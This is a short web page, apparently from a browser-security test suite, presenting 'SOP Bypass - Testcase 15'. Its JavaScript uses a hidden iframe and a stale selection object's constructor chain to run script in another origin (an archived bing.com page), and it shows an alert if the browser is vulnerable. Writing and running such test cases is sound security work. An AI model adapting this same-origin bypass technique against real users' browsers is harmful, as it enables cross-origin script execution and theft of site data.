---
layout: default
title: SOP Bypass - Testcase 15
permalink: /sop/new/15
---

<script>
function myfunction() {
    frame = document.body.appendChild(document.createElement("iframe"));
    frame.width = "0px";
    frame.height = "0px";
    wnd = frame.contentWindow;
    func = wnd.Function;
    wnd.location = "about:blank";
    frame.onload = function() {
        selection = func("return getSelection()")();
        wnd.location = "https://web.archive.org/web/20180831134341/http://www.bing.com";
        frame.onload = function() {
            frame.onload = null;
            selection.baseNode.constructor.constructor.constructor("alert(document.domain)")();
        }
    }
}
</script>

<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunction()">

**Note:**
If page displays an alert box displaying bing.com, your browser is vulnerable to SOP bypass.
